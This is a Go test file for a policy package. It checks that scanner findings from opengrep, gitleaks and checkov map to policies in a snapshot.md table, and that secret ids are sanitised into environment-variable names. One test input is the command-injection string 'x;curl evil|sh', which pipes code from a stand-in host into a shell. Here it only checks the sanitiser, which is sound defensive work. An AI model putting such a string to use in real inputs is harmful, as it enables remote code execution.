package policy

import (
	"os"
	"reflect"
	"regexp"
	"slices"
	"strings"
	"testing"
)

// The Go table is contracts/snapshot.md's, row for row in its order: one table, two readers.
func TestTheTableIsTheContracts(t *testing.T) {
	raw, err := os.ReadFile("../../contracts/snapshot.md")
	if err != nil {
		t.Fatal(err)
	}
	_, section, _ := strings.Cut(string(raw), "## Tool results mapped to a policy")
	row := regexp.MustCompile("(?m)^\\| `([a-z]+\\.[a-z][a-z-]*)` \\| `([a-z0-9-]+)` \\| ([^|]+) \\| (?:`([a-z]+)`|the tool's) \\| (?:`([^`]+)`|the tool's) \\|$")
	var doc []Mapping
	for _, m := range row.FindAllStringSubmatch(section, -1) {
		cell, spared := m[3], ""
		if b := regexp.MustCompile("^every result but a `([a-z0-9-]+)` one in a documentation file of prose$").FindStringSubmatch(cell); b != nil {
			cell, spared = "every result", b[1]
		}
		var tags []string // every code span of the Selects cell but the field it reads and the colon
		for _, t := range regexp.MustCompile("`([^`]+)`").FindAllStringSubmatch(cell, -1) {
			if t[1] != "properties.tags" && t[1] != ":" {
				tags = append(tags, t[1])
			}
		}
		doc = append(doc, Mapping{Policy: m[1], Tool: m[2], Tags: tags, Spared: spared, Severity: m[4], Fix: m[5]})
	}
	if len(doc) != len(Table) {
		t.Fatalf("snapshot.md has %d rows, the Go table %d", len(doc), len(Table))
	}
	for i := range doc {
		if !reflect.DeepEqual(doc[i], Table[i]) {
			t.Fatalf("row %d: snapshot.md %+v, Go %+v", i, doc[i], Table[i])
		}
	}
}

// A row selects by its tag, exact or before a colon, and a row without one selects every result.
func TestARowSelectsByItsTag(t *testing.T) {
	sql, deps, secrets, injection, checkov, misconfig := Table[1], Table[2], Table[0], Table[3], Table[5], Table[6]
	for _, c := range []struct {
		row  Mapping
		tags []string
		want bool
	}{
		{sql, []string{"CWE-89", "security"}, true},
		{sql, []string{"CWE-89: Improper Neutralization of Special Elements used in an SQL Command"}, true},
		{sql, []string{"CWE-890"}, false},
		{sql, nil, false},
		{deps, []string{"vulnerability", "security"}, true},
		{deps, []string{"misconfiguration"}, false},
		{secrets, nil, true},
		{injection, []string{"CWE-79: Improper Neutralization of Input During Web Page Generation"}, true},
		{injection, []string{"CWE-601"}, true},
		{injection, []string{"CWE-89"}, false},
		{injection, []string{"CWE-780"}, false},
		{injection, []string{"CWE-22x", "CWE-221: Information Loss or Omission"}, false},
		{injection, []string{"CWE-23: Relative Path Traversal"}, true},
		{injection, []string{"CWE-230", "CWE-234"}, false},
		{checkov, nil, true},
		{misconfig, []string{"misconfiguration"}, true},
		{misconfig, []string{"vulnerability"}, false},
	} {
		if got := c.row.Selects(c.tags); got != c.want {
			t.Errorf("%s on %q: %v, want %v", c.row.Policy, c.tags, got, c.want)
		}
	}
}

// The first row that selects a result wins: an opengrep rule tagged both CWE-89 and CWE-79 is sql's.
func TestTheFirstRowThatSelectsWins(t *testing.T) {
	tags := []string{"CWE-79: Cross-site Scripting", "CWE-89: SQL Injection"}
	i := slices.IndexFunc(Table, func(m Mapping) bool { return m.Tool == "opengrep" && m.Selects(tags) })
	if i < 0 || Table[i].Policy != "sql.string-concat" {
		t.Fatalf("row %d", i)
	}
}

// A mapped id names its row and the tool's own id; another tool's prefix, or sarif.<tool>, does not.
func TestMappedReadsTheTablesShapeOnly(t *testing.T) {
	if m, own, ok := Mapped("gitleaks", "secrets.client-bundle.gitleaks.stripe-access-token"); !ok || m.Policy != "secrets.client-bundle" || own != "stripe-access-token" {
		t.Fatalf("got %+v %q %v", m, own, ok)
	}
	for _, c := range [][2]string{{"semgrep", "secrets.client-bundle.gitleaks.x"}, {"gitleaks", "sarif.gitleaks.x"}, {"gitleaks", "sql.string-concat.gitleaks.x"}} {
		if _, _, ok := Mapped(c[0], c[1]); ok {
			t.Errorf("%s's %s read as mapped", c[0], c[1])
		}
	}
}

func TestSecretNameIsAlwaysANameCanyonTakes(t *testing.T) {
	for in, want := range map[string]string{"stripe-access-token": "STRIPE_ACCESS_TOKEN", "1password-secret-key": "SECRET_1PASSWORD_SECRET_KEY",
		"x;curl evil|sh": "X_CURL_EVIL_SH", "--": "SECRET_", "aws.access_key": "AWS_ACCESS_KEY"} {
		if got := SecretName(in); got != want {
			t.Errorf("%q: %q, want %q", in, got, want)
		}
	}
}
